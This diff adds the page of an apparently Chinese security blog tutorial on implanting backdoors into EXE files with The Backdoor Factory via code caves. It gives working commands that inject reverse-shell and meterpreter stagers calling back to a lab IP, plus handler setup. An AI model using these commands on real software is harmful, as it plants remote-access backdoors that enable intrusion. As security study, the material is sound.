@@ -1,0 +1,886 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>利用BDF向EXE文件植入后门 | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+The Backdoor Factory可用来向可执行文件植入后门，修改程序执行流程，执行添加的payload。
+本文将要介绍向EXE文件植入后门的原理，测试The Backdoor Factory植入后门的方法，分析细节，总结思路。
+The Backdoor Factory下载地址">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="利用BDF向EXE文件植入后门"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>利用BDF向EXE文件植入后门</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.753Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-基础知识"><span class="section table-of-contents-text">0x02 基础知识</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-文件后门植入原理"><span class="section table-of-contents-text">0x03 文件后门植入原理</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#植入原理"><span class="section table-of-contents-text">植入原理</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#利用思路"><span class="section table-of-contents-text">利用思路</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1、新加区段，权限为可读可写可执行-RWE"><span class="section table-of-contents-text">1、新加区段，权限为可读可写可执行(RWE)</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2、使用Code-Caves"><span class="section table-of-contents-text">2、使用Code Caves</span></a></li></ol></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-实际测试The-Backdoor-Factory"><span class="section table-of-contents-text">0x04 实际测试The Backdoor Factory</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、检查该文件是否适用于The-Backdoor-Factory"><span class="section table-of-contents-text">1、检查该文件是否适用于The Backdoor Factory</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、获取该文件的可用payload"><span class="section table-of-contents-text">2、获取该文件的可用payload</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3、搜索该文件可用的Code-Caves"><span class="section table-of-contents-text">3、搜索该文件可用的Code Caves</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4、添加payload"><span class="section table-of-contents-text">4、添加payload</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#1-添加新区段，保存payload"><span class="section table-of-contents-text">(1) 添加新区段，保存payload</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#2-payload保存到-data段中"><span class="section table-of-contents-text">(2) payload保存到.data段中</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#3-payload保存到其他段中"><span class="section table-of-contents-text">(3) payload保存到其他段中</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#4-自定义payload"><span class="section table-of-contents-text">(4) 自定义payload</span></a></li></ol></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-小结"><span class="section table-of-contents-text">0x05 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p><code>The Backdoor Factory</code>可用来向可执行文件植入后门，修改程序执行流程，执行添加的payload。</p>
+<p>本文将要介绍向EXE文件植入后门的原理，测试<code>The Backdoor Factory</code>植入后门的方法，分析细节，总结思路。</p>
+<p>The Backdoor Factory下载地址：</p>
+<p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍如下内容：</p>
+<ul>
+<li>EXE文件后门植入原理</li>
+<li>实际测试The Backdoor Factory</li>
+<li>分析The Backdoor Factory功能</li>
+</ul>
+<h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2><hr>
+<p><strong>PE文件格式：</strong></p>
+<p>参考资料：</p>
+<p><a href="https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files" target="_blank" rel="noopener">https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files</a></p>
+<p><strong>Code Caves：</strong></p>
+<p>参考资料：</p>
+<p><a href="https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves" target="_blank" rel="noopener">https://www.codeproject.com/Articles/20240/The-Beginners-Guide-to-Codecaves</a></p>
+<p><strong>Code Caves的直观认识：</strong></p>
+<p>使用<code>vc6.0</code>生成exe文件，查看文件中可利用的Code Caves</p>
+<p>c代码：</p>
+<pre><code>#include &quot;stdafx.h&quot;
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int array[200]={1,2,3,4,5,6,7,8,9};
+char array2[200]=&quot;123456789ABCDEF&quot;;
+
+int main(int argc, char* argv[])
+{
+    printf(&quot;hello world&quot;);    
+    return 0;
+}
+</code></pre><p>Release编译生成文件，使用Immunity Debugger打开</p>
+<p><code>View</code>-<code>Memory</code>(快捷键Alt+M)</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-1.png" alt="Alt text"></p>
+<p>hello.exe包含四个区段,分别为<code>PE header</code>、<code>.text</code>、<code>.rdata</code>和<code>.data</code></p>
+<p>查看hello.exe的<code>.data</code>段</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-2.png" alt="Alt text"></p>
+<p>发现大段的0x00数据，这些位置可被替换成payload</p>
+<h2 id="0x03-文件后门植入原理"><a href="#0x03-文件后门植入原理" class="headerlink" title="0x03 文件后门植入原理"></a>0x03 文件后门植入原理</h2><hr>
+<h3 id="植入原理"><a href="#植入原理" class="headerlink" title="植入原理"></a>植入原理</h3><p>修改程序的执行流程，跳转到Code Caves，执行payload，再返回至程序的正常流程</p>
+<p>需要注意的是程序默认只有<code>.text</code>段具有执行权限，如果将payload添加到其他段(如<code>.data</code>或<code>.rdata</code>)，需要将该段添加执行权限</p>
+<p><strong>注：</strong></p>
+<p>实际使用可通过跳转多个Code Caves拼凑执行payload</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="1、新加区段，权限为可读可写可执行-RWE"><a href="#1、新加区段，权限为可读可写可执行-RWE" class="headerlink" title="1、新加区段，权限为可读可写可执行(RWE)"></a>1、新加区段，权限为可读可写可执行(RWE)</h4><p>可使用工具LordPE</p>
+<p>手动添加可参考资料：</p>
+<p><a href="https://www.exploit-db.com/docs/42061.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/42061.pdf</a></p>
+<p><strong>优点：</strong></p>
+<p>简单直接，不需要考虑文件Code Caves的大小</p>
+<p><strong>缺点：</strong></p>
+<p>增加文件长度</p>
+<h4 id="2、使用Code-Caves"><a href="#2、使用Code-Caves" class="headerlink" title="2、使用Code Caves"></a>2、使用Code Caves</h4><p>搜索已有区段，寻找是否存在可用的Code Caves，对于不可执行的区段，还需要添加可执行权限</p>
+<p><strong>优点：</strong></p>
+<p>不改变文件大小</p>
+<p><strong>缺点：</strong></p>
+<p>需要考虑Code Caves的大小是否满足payload长度</p>
+<h2 id="0x04-实际测试The-Backdoor-Factory"><a href="#0x04-实际测试The-Backdoor-Factory" class="headerlink" title="0x04 实际测试The Backdoor Factory"></a>0x04 实际测试The Backdoor Factory</h2><hr>
+<p>Kali 2.0默认集成<code>The Backdoor Factory</code>，路径为<code>usr/share/backdoor-factory</code></p>
+<p>测试系统选为<code>Kali 2.0</code></p>
+<p>为便于测试，测试exe代码如下：</p>
+<pre><code>#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int array[200]={1,2,3,4,5,6,7,8,9};
+char array2[200]=&quot;123456789ABCDEF&quot;;
+
+int main(int argc, char* argv[])
+{
+    printf(&quot;hello world\n&quot;);    
+    system(&quot;PAUSE&quot;); 
+    return 0;
+}
+</code></pre><p>程序输出hello world后暂停</p>
+<p>下面挑选The Backdoor Factory中常见的功能进行介绍</p>
+<h3 id="1、检查该文件是否适用于The-Backdoor-Factory"><a href="#1、检查该文件是否适用于The-Backdoor-Factory" class="headerlink" title="1、检查该文件是否适用于The Backdoor Factory"></a>1、检查该文件是否适用于The Backdoor Factory</h3><pre><code>./backdoor.py -f test.exe -S
+</code></pre><p>输出如下:</p>
+<pre><code>[*] Checking if binary is supported
+[*] Gathering file info
+[*] Reading win32 entry instructions
+test.exe is supported.
+</code></pre><h3 id="2、获取该文件的可用payload"><a href="#2、获取该文件的可用payload" class="headerlink" title="2、获取该文件的可用payload"></a>2、获取该文件的可用payload</h3><pre><code>./backdoor.py -f test.exe -s show
+</code></pre><p>输出如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-3.png" alt="Alt text"></p>
+<p>可用payload如下：</p>
+<ul>
+<li>cave_miner_inline</li>
+<li>iat_reverse_tcp_inline</li>
+<li>iat_reverse_tcp_inline_threaded</li>
+<li>iat_reverse_tcp_stager_threaded</li>
+<li>iat_user_supplied_shellcode_threaded</li>
+<li>meterpreter_reverse_https_threaded</li>
+<li>reverse_shell_tcp_inline</li>
+<li>reverse_tcp_stager_threaded</li>
+<li>user_supplied_shellcode_threaded</li>
+</ul>
+<p><strong>名称解析：</strong></p>
+<p><strong>cave_miner_inline:</strong></p>
+<p>作为payload模板，长度为135，仅实现了控制流程跳转，不做其他操作，可用作自定义开发shellcode的模板</p>
+<p>反汇编的payload格式如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-4.png" alt="Alt text"></p>
+<p><strong>reverse_shell_tcp_inline：</strong></p>
+<p>对应meterpreter server：</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre><p><strong>meterpreter_reverse_https_threaded：</strong></p>
+<p>对应meterpreter server：</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+</code></pre><p><strong>iat_reverse_tcp_inline中的iat：</strong></p>
+<p>iat为Import Address Table(导入地址表)的缩写，如果PE文件的IAT不包含API LoadLibraryA和GetProcAddress，直接执行payload <code>reverse_shell_tcp_inline</code>会失败，<code>iat_reverse_tcp_inline</code>增加了修复IAT的功能，避免执行失败</p>
+<p><strong>user_supplied_shellcode_threaded：</strong></p>
+<p>自定义payload，payload可通过msf生成</p>
+<h3 id="3、搜索该文件可用的Code-Caves"><a href="#3、搜索该文件可用的Code-Caves" class="headerlink" title="3、搜索该文件可用的Code Caves"></a>3、搜索该文件可用的Code Caves</h3><pre><code>./backdoor.py -f test.exe -c
+</code></pre><p>如果payload长度为703，那么Code Caves需要满足长度大于703，参数如下：</p>
+<pre><code>./backdoor.py -f test.exe -c -l 703
+</code></pre><p>输出如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-5.png" alt="Alt text"></p>
+<p>共找到三个可供利用的位置：</p>
+<pre><code>No section
+-&gt;Begin Cave 0x240
+-&gt;End of Cave 0x1000
+Size of Cave (int) 3520
+**************************************************
+No section
+-&gt;Begin Cave 0x693a
+-&gt;End of Cave 0x700c
+Size of Cave (int) 1746
+**************************************************
+We have a winner: .data
+-&gt;Begin Cave 0x7051
+-&gt;End of Cave 0x7350
+Size of Cave (int) 767
+SizeOfRawData 0x1000
+PointerToRawData 0x7000
+End of Raw Data: 0x8000
+</code></pre><p>输出的地址为相对虚拟地址(Relative Virtual Address)，即相对于文件头(基地址Image Base)的偏移地址</p>
+<p>在内存中的实际地址(虚拟地址Virtual Address)=Image Base+RVA</p>
+<p>ImageBase = 0x00400000</p>
+<p>使用Immunity Debugger查看内存结构，进行验证</p>
+<p>内存结构如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-6.png" alt="Alt text"></p>
+<p><strong>(1)</strong></p>
+<p>No section<br>-&gt;Begin Cave 0x240<br>-&gt;End of Cave 0x1000<br>Size of Cave (int) 3520</p>
+<p>内存中实际地址为0x00400240-0x00401000，位于PE header中，默认权限为<code>R</code></p>
+<p>查看内存地址数据如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-7.png" alt="Alt text"></p>
+<p><strong>(2)</strong></p>
+<p>No section<br>-&gt;Begin Cave 0x693a<br>-&gt;End of Cave 0x700c<br>Size of Cave (int) 1746</p>
+<p>内存中实际地址为0x0040693a-0x0040700c,位于.rdata段中，默认权限为<code>R</code></p>
+<p>查看内存地址数据如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-8.png" alt="Alt text"></p>
+<p><strong>(3)</strong></p>
+<p>We have a winner: .data<br>-&gt;Begin Cave 0x7051<br>-&gt;End of Cave 0x7350<br>Size of Cave (int) 767</p>
+<p>内存中实际地址为0x00407051-0x00407350,位于.data段中，默认权限为<code>RW</code></p>
+<p>查看内存地址数据如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/0-9.png" alt="Alt text"></p>
+<p>可以看到，通过The Backdoor Factory找到的Code Caves均符合要求</p>
+<h3 id="4、添加payload"><a href="#4、添加payload" class="headerlink" title="4、添加payload"></a>4、添加payload</h3><p>这里选用<code>reverse_tcp_stager_threaded</code>进行测试，payload长度为703</p>
+<p>Server：</p>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre><h4 id="1-添加新区段，保存payload"><a href="#1-添加新区段，保存payload" class="headerlink" title="(1) 添加新区段，保存payload"></a>(1) 添加新区段，保存payload</h4><pre><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -o test1.exe
+</code></pre><p>新区段名称为<code>.sdata</code>，权限为<code>RWE</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-1.png" alt="Alt text"></p>
+<p>若指定新添加区段名称为aaa,参数如下：</p>
+<pre><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -a -n aaa -o test1.exe
+</code></pre><h4 id="2-payload保存到-data段中"><a href="#2-payload保存到-data段中" class="headerlink" title="(2) payload保存到.data段中"></a>(2) payload保存到.data段中</h4><pre><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test2.exe
+</code></pre><p>根据提示选择<code>.data</code>段</p>
+<p><code>.data</code>段权限更改为<code>RWE</code>，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-2.png" alt="Alt text"></p>
+<p>程序入口点添加跳转代码<code>JMP TEST2.00407055</code>，<code>0x00407055</code>保存添加的payload</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-3.png" alt="Alt text"></p>
+<h4 id="3-payload保存到其他段中"><a href="#3-payload保存到其他段中" class="headerlink" title="(3) payload保存到其他段中"></a>(3) payload保存到其他段中</h4><pre><code>./backdoor.py -f test.exe -H 192.168.81.192 -P 4444 -s reverse_tcp_stager_threaded -o test3.exe
+</code></pre><p>根据提示选择PE header，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-4.png" alt="Alt text"></p>
+<p>执行会报错，需要对其进行修复</p>
+<p>可使用工具<code>nasm_shell</code>将汇编代码转换为十六进制数据</p>
+<p>Kali2.0默认集成nasm_shell</p>
+<p>工具使用如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-5.png" alt="Alt text"></p>
+<h4 id="4-自定义payload"><a href="#4-自定义payload" class="headerlink" title="(4) 自定义payload"></a>(4) 自定义payload</h4><p>生成payload：</p>
+<pre><code>msfvenom -p windows/messagebox -f raw &gt;msg.bin
+</code></pre><p>添加payload：</p>
+<pre><code>./backdoor.py -f test.exe -s user_supplied_shellcode_threaded -U msg.bin -o test4.exe
+</code></pre><p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-20/1-6.png" alt="Alt text"></p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><hr>
+<p>本文介绍了使用<code>The Backdoor Factory</code>向EXE文件植入后门的方法，利用Code Caves能够不改变原文件的大小。</p>
+<p>当然，该利用方法已经被杀毒软件查杀，本文介绍的内容仅作技术研究。</p>
+<p>站在防御的角度，下载文件时需要多加注意，只从可信源下载程序，同时校验文件hash。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="ae4f4d03.html" rel="next" title="利用BDF向DLL文件植入后门">
+    上一篇：利用BDF向DLL文件植入后门
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="5140417.html" rel="next" title="Catalog签名伪造——Long UNC文件名欺骗">
+    下一篇：Catalog签名伪造——Long UNC文件名欺骗
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
